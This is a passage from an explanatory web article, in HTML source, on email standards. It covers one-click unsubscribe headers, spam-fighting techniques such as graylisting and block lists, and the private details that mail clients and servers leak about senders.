which is useful for digests of <a href="#mailing-list">mailing lists</a>.</li>
    <li><code>multipart/report</code> (<a href="https://datatracker.ietf.org/doc/html/rfc6522"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6522</a>):
Complement human-readable <a href="#bounce-messages">(non-)delivery reports</a> with a machine-processable part.</li>
    <li><code>multipart/signed</code> (<a href="https://datatracker.ietf.org/doc/html/rfc1847#section-2.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1847</a>):
<a href="#multipart-message-nesting">Append the signature</a>, which is generated over the first <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> part, in the second part.</li>
    <li><code>multipart/encrypted</code> (<a href="https://datatracker.ietf.org/doc/html/rfc1847#section-2.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1847</a>):
<a href="#multipart-message-nesting">Prepend the information</a> needed to decrypt the second <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> part in the first part.</li>
  </ul>

</details>

<p>After many encoding-related sections,
I want to mention two more format-related aspects before moving on to <a href="#issues">issues with email</a>.</p>

<h3 id="one-click-unsubscribe">One-click unsubscribe</h3>

<p>If you are subscribed to a <a href="#mailing-list">mailing list</a>,
you may want to unsubscribe from the list after having received a message you no longer want to receive.
Most mailing lists include a link at the bottom of each sent message,
which you can click to unsubscribe from the mailing list.
Since this is a link like any other in the message, a browser window is opened
and you might have to click on additional buttons there to finally unsubscribe from the list.
This can be a bit of a hassle, especially on mobile phones.
Fortunately, <a href="https://datatracker.ietf.org/doc/html/rfc2369"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2369</a> specifies an easier way to achieve the same.
Mailing lists should include a <a href="https://datatracker.ietf.org/doc/html/rfc2369#section-3.2"><code>List-Unsubscribe</code> header field</a>
so that mail clients can provide a uniform unsubscribe experience across mailing lists:
You simply click on “Unsubscribe” and your mail client takes care of the rest.</p>

<figure>

  <div><div><pre><code>List-Unsubscribe: &lt;https://example.com/unsubscribe?token=XYZ&gt;,
  &lt;mailto:unsubscribe@example.com?subject=Unsubscribe&gt;
</code></pre></div>  </div>

  <figcaption>

The <code>List-Unsubscribe</code> header field provides a standardized way to unsubscribe from a mailing list.
If there are several options in angle brackets, the mail client should use the first one that it supports.

</figcaption>
</figure>

<p>To be precise, <a href="https://datatracker.ietf.org/doc/html/rfc2369"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2369</a> didn’t require
that there is no additional user interaction.
In fact, user confirmation was often necessary in order to prevent accidental unsubscriptions
triggered by anti-spam programs which simply fetch all the links in a message.
For this reason, <a href="https://datatracker.ietf.org/doc/html/rfc8058"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8058</a>
defines an additional header field with more precise semantics:
When the user clicks on “Unsubscribe”,
the mail client sends a <a href="https://en.wikipedia.org/wiki/POST_(HTTP)"><code>POST</code> request</a>
to the <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> resource specified in the <code>List-Unsubscribe</code> header field
with the value of the new <code>List-Unsubscribe-Post</code> header field in the body of the request.
The <code>List-Unsubscribe-Post</code> header field has to contain <code>List-Unsubscribe=One-Click</code>,
and both header fields <a href="https://datatracker.ietf.org/doc/html/rfc8058#section-4">must be covered</a>
by a valid <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signature</a>.</p>

<figure>

  <div><div><pre><code>List-Unsubscribe-Post: List-Unsubscribe=One-Click
</code></pre></div>  </div>

  <figcaption>

The <code>List-Unsubscribe-Post</code> header field informs the receiving mail client
that it can unsubscribe the user with a simple <code>POST</code> request.

</figcaption>
</figure>

<p>The body of the <code>POST</code> request is encoded with the <a href="#content-type">content type</a>
<code>multipart/form-data</code> as specified in <a href="https://datatracker.ietf.org/doc/html/rfc7578"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7578</a>
or <code>application/x-www-form-urlencoded</code> as specified by the
<a href="https://en.wikipedia.org/wiki/WHATWG">Web Hypertext Application Technology Working Group (<abbr title="Web Hypertext Application Technology Working Group">WHATWG</abbr>)</a>
in their <a href="https://url.spec.whatwg.org/#application/x-www-form-urlencoded"><abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr> spec</a>.
The request has to be sent without context information such as <a href="https://en.wikipedia.org/wiki/HTTP_cookie">cookies</a>.
The user has to be authenticated with a <a href="https://en.wikipedia.org/wiki/Access_token">token</a> in the <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr>.</p>

<figure>

  <div><div><pre><code>POST /unsubscribe?token=XYZ HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

List-Unsubscribe=One-Click
</code></pre></div>  </div>

  <figcaption>

The <code>POST</code> request to unsubscribe a user from a mailing list
<a href="https://support.google.com/a/answer/81126">as generated by Gmail</a>.
You find an example <code>POST</code> request using <code>multipart/form-data</code>
in <a href="https://datatracker.ietf.org/doc/html/rfc8058#section-8.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8058</a>.

</figcaption>
</figure>

<p>These two header fields are not only convenient for users,
they also make unsubscribing more secure since mail clients don’t include them when forwarding a message.
If you want to prevent others from unsubscribing you from a mailing list,
you have to remove the unsubscribe link at the bottom of a message yourself before forwarding the message.</p>



<p><a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a> maintains a long list of
<a href="https://www.iana.org/assignments/message-headers/message-headers.xhtml">registered message header fields</a>.
The ones specified in an <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> and thus endorsed by <abbr title="Internet Engineering Task Force">IETF</abbr> are called permanent header fields.
The ones registered for <a href="https://datatracker.ietf.org/doc/html/rfc8126#section-4.1">private use</a>
without official recognition are called provisional header fields.
<a href="https://datatracker.ietf.org/doc/html/rfc3864"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3864</a> outlines the registration procedure for header fields.
It’s common to start the name of custom header fields with <code>X-</code>,
but unlike in the case of <a href="#content-type">content types</a>,
there is no requirement for this.
<a href="https://datatracker.ietf.org/doc/html/rfc822#section-4.7.4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 822</a> just promised that
official header fields will never start with <code>X-</code>.
This provision regarding extension header fields was dropped
in <a href="https://datatracker.ietf.org/doc/html/rfc5322#appendix-B">later revisions</a>, though.
During my research for this article,
I’ve inspected a ton of messages in their <a href="#raw-message">raw format</a>.
The funniest header field I came across is the following one from <a href="https://www.booking.com/">Booking.com</a>:</p>

<figure>

  <div><div><pre><code>X-Recruiting: Like mail headers? Come write ours: https://careers.booking.com
</code></pre></div>  </div>

  <figcaption>

This is one way to reach nerds like me.
I’m not <em>that</em> excited about email headers, though. 😅

</figcaption>
</figure>

<h2 id="issues">Issues</h2>

<p>Email is both a blessing and a curse.
On the one hand, email is by far the most important decentralized messaging service that we have,
which should be reason enough to cherish it.
The only other decentralized messaging service which comes close to email in terms of ubiquity
is the <a href="https://en.wikipedia.org/wiki/SMS">Short Message Service (<abbr title="Short Message Service">SMS</abbr>)</a>.
On the other hand, email has become so dysfunctional that many of us would like to leave it behind.
In this chapter, we’ll look at the issues that plague modern email.
In the <a href="#fixes">last chapter</a>,
we’ll discuss how some of the security-related issues are being addressed.</p>

<h3 id="spam">Spam</h3>

<p>Unsolicited messages which are sent in large quantities are called
<a href="https://en.wikipedia.org/wiki/Email_spam">spam</a> or
<a href="https://en.wikipedia.org/wiki/Junk_mail">junk mail</a>.
<a href="https://en.wikipedia.org/wiki/Spam_(food)">Spam</a> is a brand of canned pork, which was introduced in 1937.
Spam is likely an abbreviation for spiced ham.
It became ubiquitous during and after <a href="https://en.wikipedia.org/wiki/World_War_II">World War II</a> when food was rationed.
The British comedy group <a href="https://en.wikipedia.org/wiki/Monty_Python">Monty Python</a>
made fun of this fact in a <a href="https://en.wikipedia.org/wiki/Spam_(Monty_Python)">famous sketch</a> in 1970.
The term got adopted to refer to undesirable things which come in excessive quantities – including junk mail.</p>

<p>Any messaging service which is popular, open, and free will have spam sooner or later.
Thus, spam isn’t a result of the shortcomings of email but rather a consequence of its desirable properties.
Since unsolicited messages are annoying,
people try to eliminate junk mail from their inboxes with
<a href="#heuristics">heuristics</a>, <a href="#blacklists">blacklists</a>, and <a href="#challenges">challenges</a>.
While <a href="https://en.wikipedia.org/wiki/Anti-spam_techniques">such techniques</a> make spam bearable,
they don’t solve the underlying problem of unsolicited mail:
Anyone in the world can add tasks to the to-do list which is your inbox.
In my opinion, mail clients should separate messages from unapproved senders from your inbox
so that the messages you actually want to receive don’t drown in the noise.
This is similar to how I almost never accept calls from numbers that I haven’t stored in my phone.
Even though this feature has to be tremendously useful for anyone who doesn’t want to be bothered
by random sales people and their never-ending followups,
<a href="https://hey.com/features/the-screener/">HEY</a> is the only mail client I know of
which lets you screen your email senders.
And just like I block call centers, I also block email senders, of course.
However, the default shouldn’t be “allowed unless blocked”
but rather “blocked unless allowed”.
Additionally, messages are typically blocked on the client-side
because most mail clients still don’t support <a href="#email-filtering">server-side filtering</a>.</p>

<details>
  <summary id="heuristics">
Heuristics
</summary>

  <p>Labelling messages as spam based on their content and origin
is a <a href="https://en.wikipedia.org/wiki/Statistical_classification">classification problem</a>.
<a href="https://en.wikipedia.org/wiki/Probabilistic_classification">Probabilistic classifiers</a>
calculate how likely an incoming message is spam based on statistical models.
A popular method is <a href="https://en.wikipedia.org/wiki/Naive_Bayes_spam_filtering">Naive Bayes spam filtering</a>.
Since messages are either kept in the inbox or discarded as spam,
the continuous probability has to be converted into a
<a href="https://en.wikipedia.org/wiki/Binary_classification">binary decision</a>.
If the probability that a message is spam is above a certain threshold value, it is discarded.
While users hate spam, they hate losing legitimate messages due to spam filters even more.
In other words, the <a href="https://en.wikipedia.org/wiki/False_positive_rate">rate of false positives</a>
has to be close to zero, while the rate of false negatives can be higher.
For this reason, the threshold for discarding a message is usually quite high.
Messages with a score above a lower threshold are typically moved to a spam folder
so that the user can decide what to do with them.</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th> </th>
          <th>Is spam</th>
          <th>Is not spam</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><strong>Labelled as spam</strong></td>
          <td>True positive</td>
          <td><em>False positive</em></td>
        </tr>
        <tr>
          <td><strong>Labelled as non-spam</strong></td>
          <td><em>False negative</em></td>
          <td>True negative</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

How binary classifiers are <a href="https://en.wikipedia.org/wiki/Evaluation_of_binary_classifiers">evaluated</a>.
When labelling spam, you want to have as few false positives as possible,
even if this increases the rate of false negatives as well.

</figcaption>
  </figure>

  <p>Filtering messages based on heuristics
is a <a href="https://en.wikipedia.org/wiki/Cat_and_mouse">cat-and-mouse game</a>:
The better the filters,
the higher the <a href="https://en.wikipedia.org/wiki/Evolutionary_pressure">selective pressure</a> on spammers.
While dropping messages without a <a href="#bounce-messages">bounce message</a>
violates the principle that messages are either delivered or returned,
you don’t want to reject messages based on their content
as this would offer spammers a valuable test environment.</p>

</details>

<details>
  <summary id="blacklists">
Blacklists
</summary>

  <p>As long as spammers send their unsolicited messages from the same sources,
you can get rid of all their junk simply by blocking all traffic from these sources.
Historically, lists of blocked addresses are known as <a href="https://en.wikipedia.org/wiki/Blacklist_(computing)">blacklists</a>
and lists of allowed addresses as <a href="https://en.wikipedia.org/wiki/Whitelisting">whitelists</a>.
Since some consider the positive and negative connotations of white and black to be racially charged,
the <abbr title="Information Technology">IT</abbr> industry is moving to replace these terms with block or deny list and allow or pass list,
even though the traditional terms <a href="https://en.wikipedia.org/w/index.php?title=Blacklist_(computing)&amp;oldid=1018063818#Controversy_over_use_of_the_term">likely predate attribution to race</a>.
In the spirit of making the <abbr title="Information Technology">IT</abbr> industry and our societies more inclusive, I welcome these changes.
The main reason why I stuck with the old terms is the next box:
The anti-spam technique is known only as <a href="#graylisting">graylisting</a>.
If I were to speak of temporarily-reject listing, many would have no idea what I’m talking about.</p>

  <p>While block lists are already useful when every provider maintains their own list,
they are much more powerful when they are shared among mailbox providers.
The best-known maintainer of block lists is <a href="https://en.wikipedia.org/wiki/The_Spamhaus_Project">The Spamhaus Project</a>.
Before you try to relay email directly with the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a>,
you can use the <a href="https://www.spamhaus.org/lookup/">Spamhaus <abbr title="Internet Protocol">IP</abbr> and Domain Reputation Checker</a>
to determine whether your <abbr title="Internet Protocol">IP</abbr> address is blocked.
If you use and misuse the <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool a lot, your address may get listed there.
Once your address is on their block list, your chances of relaying emails successfully dwindle.
Block lists are fed by spam filters, which in turn are trained by users, who mark unwanted messages as spam.
Another way to identify spammers is to set up a <a href="https://en.wikipedia.org/wiki/Honeypot_(computing)">honeypot</a>:
An email server or email address which is positioned to attract spammers
but unlikely to be contacted by legitimate parties.
Anyone who takes the bait can be blocked.</p>

</details>

<details>
  <summary id="graylisting">
Graylisting
</summary>

  <p>Similar to requiring a <a href="#reverse-dns-entry">reverse <abbr title="Domain Name System">DNS</abbr> entry</a>,
<a href="https://en.wikipedia.org/wiki/Greylisting_(email)">graylisting</a> is a hand-crafted heuristic:
Legitimate emails likely pass the hurdle, while spammers fail often enough for the hurdle to be useful.
<a href="#incoming-mail-server">Incoming mail servers</a> can reject incoming mail with a temporary error.
(Since you might get graylisted yourself when you use the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a>:
The reply codes for temporary errors <a href="https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes">start with a 4</a>.)
Outgoing mail servers of legitimate parties keep the emails which could not yet be delivered in their queue.
Spammers, on the other hand, typically continue with the next address in their list
without coming back to the addresses which failed on the first attempt.
By rejecting messages from unknown senders temporarily,
mail servers can reduce the volume of spam significantly.
The disadvantage of graylisting is that it also delays the delivery of legitimate messages.
<a href="https://datatracker.ietf.org/doc/html/rfc5321#page-67"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> recommends waiting at least 30 minutes before the next attempt.
Emails which aren’t delivered instantly are as annoying as spam:
If you sign up on a new website or reset your password, you want to be able to continue immediately.
Nonetheless, graylisting is the lesser evil.</p>

</details>

<details>
  <summary id="patience">
Patience
</summary>

  <p>There are other areas where the
<a href="https://en.wikipedia.org/wiki/Anti-spam_techniques#Strict_enforcement_of_RFC_standards">strict enforcement of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> standards</a>
pose a hurdle for impatient spammers:</p>
  <ul>
    <li><strong>Greeting delay</strong>: <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> clients <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.3.1">should wait</a>
for the greeting from the server before sending the
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.1"><code>EHLO</code> command</a>.
Spammers who want to maximize the use of their bandwidth
either drop the connection when the greeting is delayed
or send the <code>EHLO</code> command immediately, which can be rejected by the server.
By delaying the greeting only for unknown senders,
you can slow down spammers without affecting everyone.
Slowing down fraudulent software is also known as <a href="https://en.wikipedia.org/wiki/Tarpit_(networking)">tarpitting</a>.</li>
    <li><strong>Quit detection</strong>: <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> clients must send the
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.10"><code>QUIT</code> command</a> before closing the connection.
Since the email is already queued for delivery at this point,
some spammers skip this step so that they can open the next connection sooner.
When a mail server detects this behavior, it can include this information in its spam assessment.</li>
    <li><strong>Invalid pipelining</strong>: In order to reduce the number of <a href="https://evalapply.org/internet/#network-performance">round trips</a>,
many mail servers allow clients to <a href="#common-smtp-extensions">batch their commands</a>.
The standard requires, though, that clients wait for the response code of
<a href="https://datatracker.ietf.org/doc/html/rfc2920#section-3.1">certain commands</a>.
As you can see in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above when you activate pipelining,
the client has to wait for the response to the <code>EHLO</code> command
to determine whether the server even supports pipelining
and for the response to the <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.4"><code>DATA</code> command</a>
before sending the actual message.
Since spammers don’t care about errors, they are tempted to send all commands at once.
Mail servers can detect invalid pipelining and reject all messages from such senders.</li>
    <li><strong>Invalid <abbr title="Mail eXchange">MX</abbr> records</strong>: <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> clients should connect to the
<a href="#address-resolution">mail server with the highest priority</a> first.
If the server cannot be reached,
they should attempt to connect to the mail server with the second-highest priority.
Since some spammers don’t retry on failure but legitimate senders do, you can point the
<a href="https://en.wikipedia.org/wiki/MX_record"><abbr title="Mail eXchange">MX</abbr> record</a> with the highest priority to a non-existent server.
This technique is called <a href="https://en.wikipedia.org/wiki/Nolisting">nolisting</a>.</li>
  </ul>

</details>

<details>
  <summary id="challenges">
Challenges
</summary>

  <p>Spamming is an economic activity, and economic activities are worthwhile only if the benefits are higher than the costs.
The reason why there is so much spam is because
the <a href="https://en.wikipedia.org/wiki/Marginal_cost">marginal cost</a> of sending an email is almost zero.
If we increase the cost of sending emails by just a little bit, most spammers would go out of business.
There are two ways to increase the cost of sending emails in large quantities:
You can require manual intervention from unknown senders
or force them to waste a costly resource such as electricity, bandwidth, or memory.
In both cases, your incoming mail server or your mail client would send a puzzle to the sender,
who needs to solve it in order for their email to be delivered to your inbox.
To require attention from a human,
you can send them a <a href="https://en.wikipedia.org/wiki/CAPTCHA">CAPTCHA</a>.
To require attention from a machine,
you can ask it for <a href="#applications-of-cryptographic-hash-functions">proof of its work</a>.
Since your challenge is an <a href="#automatic-responses">automatic response</a>,
care needs to be taken to avoid <a href="#mail-loops">mail loops</a>.
The main disadvantage is that you confirm the existence of your email address to anyone
(unless your mail server sends a challenge for existent and non-existent recipients).
Given that you now have an effective system against spam and that many email addresses
<a href="#address-munging">are public</a> anyway, this shouldn’t be a problem in practice.
To be honest, I’m surprised that this old and simple idea isn’t being used more often.
The difficulty of the puzzle could depend on the <a href="#heuristics">likelihood of the message being spam</a>.
Companies such as online platforms would have to ask their users to <a href="#blacklists">whitelist</a> their domain,
let them recover the first message from the spam folder – or employ people to solve the puzzles.</p>

</details>

<details>
  <summary id="reputation">
Reputation
</summary>

  <p>The origin of a message plays a crucial role when assessing its trustworthiness.
In the absence of <a href="#domain-authentication">domain authentication</a>,
it’s mostly the reputation of the sender’s <abbr title="Internet Protocol">IP</abbr> address,
which determines whether a message gets delivered.
Once emails can no longer be <a href="#spoofing">spoofed</a>,
the reputation of the sender’s domain will also become important.
When you deliver emails from a new <abbr title="Internet Protocol">IP</abbr> address,
they will likely land in the spam folder of their recipients
even if you follow all best practices.
Your <abbr title="Internet Protocol">IP</abbr> address just isn’t known yet to deliver emails that users want to receive.
A good reputation takes time to build,
which makes it quite difficult to run your outgoing mail server yourself.
Especially as a company, you want all your customers to receive all your emails.
In order to achieve a high delivery rate (also called <em>good deliverability</em>), you typically buy
into the <a href="https://en.wikipedia.org/wiki/Reputation_capital">reputation capital</a> of another company.
A whole industry evolved around just this value proposition.
Such companies are known as <a href="https://en.wikipedia.org/wiki/Email_service_provider_(marketing)">email service providers</a>
or <a href="https://docs.sendgrid.com/glossary/smtp-provider">email delivery vendors</a>,
and they offer a <a href="https://en.wikipedia.org/wiki/Email_marketing#Transactional_emails">transactional email service</a>.
The downside of this reputation system is that email is no longer really an open service
if you have to purchase the qualification to send messages from another company.
The upside of this system is that companies are incentivized to protect their reputation:
They rather want to make it as easy as possible for readers to
<a href="#one-click-unsubscribe">unsubscribe from their newsletter</a>
than to risk being flagged as spam.</p>

</details>

<details>
  <summary id="address-munging">
Address munging
</summary>

  <p>One of the best ways to avoid getting spammed is to keep your email address as private as possible.
Unfortunately, a single hack of one of your service providers is enough to expose your address permanently.
Spammers <a href="https://en.wikipedia.org/wiki/Email-address_harvesting">harvest email addresses</a> in various ways.
Besides purchasing lists of email addresses on the <a href="https://en.wikipedia.org/wiki/Black_market">black market</a>
from hackers and other spammers, they use programs,
so-called <a href="https://en.wikipedia.org/wiki/Web_crawler">crawlers</a>,
which search the Web for email addresses.
In an attempt to prevent their address from being collected,
people often disguise their address when publishing it online.
For example, instead of writing <code>user@example.com</code>, they write <code>user[at]example.com</code> and the like.
This practice is called <a href="https://en.wikipedia.org/wiki/Address_munging">address munging</a>,
and it is most effective if the particular technique is rarely used or difficult to revert.
Unless the address obfuscation is reverted in the browser with <a href="https://en.wikipedia.org/wiki/JavaScript">JavaScript</a>,
readers who want to contact the person cannot simply click on a <a href="https://en.wikipedia.org/wiki/Mailto">mailto link</a>.
Other approaches such as encoding email addresses as images instead of text
reduces the <a href="https://en.wikipedia.org/wiki/Accessibility">accessibility</a> for people
who rely on <a href="https://en.wikipedia.org/wiki/Screen_reader">screen readers</a>.</p>

</details>

<details>
  <summary id="legal-requirements">
Legal requirements
</summary>

  <p>Many countries adopted <a href="https://en.wikipedia.org/wiki/Email_spam_legislation_by_country">anti-spam laws</a>,
which ban unsolicited bulk mailing.
While the <a href="https://en.wikipedia.org/wiki/Email_marketing#Legal_requirements">legal requirements for email marketing</a>
vary by country, you’re typically restricted to contact only people
who gave their explicit consent to being contacted by you.
Additionally, you usually have to provide a way to opt out from your mailing list,
include the name of your company and its physical mailing address,
ensure that the <code>From</code> and <code>Reply-To</code> address are valid and active,
and provide non-misleading content in the subject and body of your email.
On top of that, you also have to adhere to privacy acts, such as the European
<a href="https://en.wikipedia.org/wiki/General_Data_Protection_Regulation">General Data Protection Regulation (GDPR)</a>.
Since another person can generally sign you up to a <a href="https://en.wikipedia.org/wiki/Newsletter">newsletter</a>,
it’s a good practice to ask new subscribers via email to confirm their subscription
before sending them the newsletter.
This practice is known as
<a href="https://en.wikipedia.org/wiki/Opt-in_email#Confirmed_opt-in_(COI)/Double_opt-in_(DOI)">double opt-in</a>,
and without confirming the email address,
you will likely struggle to prove that the recipient gave their explicit consent.</p>

</details>

<h3 id="privacy">Privacy</h3>

<p>If you send an email to someone, you want to share certain information with that person.
Mail clients and mail servers, however, share a lot more information than what the users intended to share.
In this subsection, I list all the subtle information disclosures that users likely aren’t aware of.
If you know of other privacy leaks, please <a href="mailto:contact@ef1p.com">let me know</a>.</p>

<h4 id="sender-towards-recipients">Sender towards recipients</h4>

<p>The recipient of a message often learns the following information about the sender:</p>
<ul>
  <li><strong><abbr title="Internet Protocol">IP</abbr> address</strong>: When you submit an email to an outgoing mail server,
most mail servers add your <a href="https://evalapply.org/internet/#network-layer"><abbr title="Internet Protocol">IP</abbr> address</a> to the message
as part of the <a href="#trace-information">trace information</a>.
As a recipient, you find the <abbr title="Internet Protocol">IP</abbr> address from which a message was sent in an <code>x-originating-ip</code> header field
or in the square brackets in the first parentheses of the last <code>Received</code> header field.
(Each mail server through which an email passes adds an additional <code>Received</code> header field at the top,
which means that the first <code>Received</code> header field, which was added by the outgoing mail server, is at the bottom.)
There are three important implications of this.
Firstly, your outgoing mail server leaks your rough physical location to all recipients.
In other words, never send to your boss that you’re sick at home from your holiday apartment.
Similarly, recipients can tell whether you’re still at work or went home already.
Secondly, recipients can launch a <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a>.
Due to <a href="https://evalapply.org/internet/#network-address-translation">network address translation (<abbr title="Network Address Translation">NAT</abbr>)</a>,
the target would typically be your router rather than your machine, but your Internet connection goes down either way.
Thirdly, if you visited the website of an email recipient anonymously or pseudonymously,
the recipient now knows who this user on their website is.
To find out whether your outgoing mail server includes your <abbr title="Internet Protocol">IP</abbr> address in the messages that you send,
send a message to yourself and search for your <abbr title="Internet Protocol">IP</abbr> address <a href="#raw-message">in the message headers</a>.
You can use the following tool with an empty input field to determine your <abbr title="Internet Protocol">IP</abbr> address.
You can also use the tool to <a href="https://evalapply.org/internet/#ip-geolocation">locate the <abbr title="Internet Protocol">IP</abbr> address</a> of someone who sent you an email.
The tool uses the geolocation <abbr title="Application Programming Interface">API</abbr> of <a href="https://ipinfo.io/">ipinfo.io</a>.
    
    <p>If you don’t want your mailbox provider to leak your own <abbr title="Internet Protocol">IP</abbr> address,
you can use a <a href="https://en.wikipedia.org/wiki/Virtual_private_network">Virtual Private Network (<abbr title="Virtual Private Network">VPN</abbr>)</a>
or an <a href="https://en.wikipedia.org/wiki/Overlay_network">overlay network</a> for anonymous communication,
such as <a href="https://www.torproject.org/">Tor</a>.
Alternatively, you can use a mailbox provider which values your privacy,
such as <a href="https://proton.me/mail/security">Proton Mail</a>
or <a href="https://tutanota.com/security/#enhanced-privacy-features">Tutanota</a>.
Sending messages from the <a href="#webmail">web interface</a> of a mailbox provider usually also helps.
For example, if you compose an email on <a href="https://gmail.com/">gmail.com</a>,
your <abbr title="Internet Protocol">IP</abbr> address is not included in the outgoing message.
If you submit a message from your desktop client to Gmail using <a href="#delivery-protocols"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a>,
on the other hand, your <abbr title="Internet Protocol">IP</abbr> address is added by <code>smtp.gmail.com</code> in a <code>Received</code> header field.
While <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> says that the <abbr title="Internet Protocol">IP</abbr> address of the source
should be included in the <code>Received</code> header field during <a href="#submission-versus-relay">message relay</a>,
mailbox providers should ignore this instruction during <a href="#submission-versus-relay">message submission</a>, in my opinion.
I understand that mailbox providers may want to record the <abbr title="Internet Protocol">IP</abbr> address of the sender
to prevent abuse of their service,
I just see no reason to share this information with the recipients of a message.
In fact, it might even be illegal to do so.
Many privacy acts, such as the European
<a href="https://en.wikipedia.org/wiki/General_Data_Protection_Regulation">General Data Protection Regulation (GDPR)</a>,
forbid service providers to share personal data without the user’s explicit consent.
Since the third party with whom the personal data is being shared can be different for every email,
the user’s consent would be required every time they send an email.
If you’re a lawyer and you think that this reasoning has some merit,
let me know so that we can file a <a href="https://en.wikipedia.org/wiki/Class_action">class-action lawsuit</a>
to bring this industry practice to an end.</p>
  </li>
  <li><strong>Device name</strong>: Mail servers also include the client’s argument to the <code>EHLO</code> command in the <code>Received</code> header field.
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> requires that the client uses its
<a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">fully qualified domain name</a>
if it has one or its <abbr title="Internet Protocol">IP</abbr> address otherwise.
In spite of this, Thunderbird and maybe other clients
use the name of your device in the local network as the argument.
On macOS, you find the <a href="https://support.apple.com/guide/mac-help/change-computers-local-hostname-mac-mchlp2322/mac">name of your device</a> in the “Sharing” tab of your “System Preferences”.
By default, it starts with the first name of your user account.
In my case, my computer is reachable under <code>Kaspars-MacBook-Pro.local</code> in the local network.
As a <a href="https://en.wikipedia.org/wiki/Whistleblower">whistleblower</a>, I might create a new email address
and even use an anonymization service, such as Tor, just to have my mail client and mail server leak my real name.
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-7.6"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> even warns about exactly this problem.
I reported <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1680197">this privacy bug</a>
to Mozilla Thunderbird on 2 December 2020.
Until a fix is available, you can set the <code>mail.smtpserver.default.hello_argument</code> option in the
<a href="https://support.mozilla.org/en-US/kb/config-editor">config editor</a> to <code>[192.168.1.1]</code>.
Such a value is typical for the vast majority of people
due to <a href="https://evalapply.org/internet/#network-address-translation">network address translation (<abbr title="Network Address Translation">NAT</abbr>)</a>.</li>
  <li><strong>Timezone</strong>: The <a href="#origination-date">sent date</a> is usually encoded in the timezone of the sender.
By looking at the offset from the <a href="https://en.wikipedia.org/wiki/Greenwich_Mean_Time">Greenwich Mean Time (<abbr title="Greenwich Mean Time">GMT</abbr>)</a>,
the recipient learns from which <a href="https://en.wikipedia.org/wiki/Longitude">longitude</a> a message was sent.
In my opinion, mail clients should always encode the <code>Date</code> field in Greenwich Mean Time.</li>
  <li><strong>Mail client</strong>: Many mail clients put their name with their current version
into a <code>User-Agent</code> or <code>X-Mailer</code> header field.
Some mail clients even include the name and the version of the operating system on which they run.
While such data is usually harmless,
it can provide valuable information to someone who wants to attack you.
Given the intricacies of email, mail clients can also be identified by
how they <a href="#boundary-delimiter">delimit parts</a>,
how they <a href="#content-disposition">label files</a>,
how they <a href="#email-styling">style messages</a>,
how they <a href="#quoting-html-messages">quote messages</a>, and so on.
This is known as <a href="https://en.wikipedia.org/wiki/Device_fingerprint">fingerprinting</a>,
and it allows a recipient to determine how likely separate messages were sent from the same client.</li>
  <li><strong>Display names</strong>: Your mail client not just adds your name
as a <a href="#display-name">display name</a> in the <code>From</code> address,
it also adds a display name for each recipient it knows.
This can leak how you’ve stored a recipient in your address book
(i.e. be careful under what name you store the colleague you’re having an affair with)
and with whom of the recipients you’ve been in contact before
(because mail clients usually add display names from earlier conversations automatically).
As a recipient, you have to inspect the raw message to see what the sender provided
because your mail client typically overwrites the display names with the information from its own address book.
In my opinion, mail clients should remove the display names of recipients before sending a message.</li>
  <li><strong>Hidden recipients</strong>: The <a href="#trace-information"><code>Received</code> header field</a> has an optional <code>for</code> clause,
which contains the address of the specified recipient.
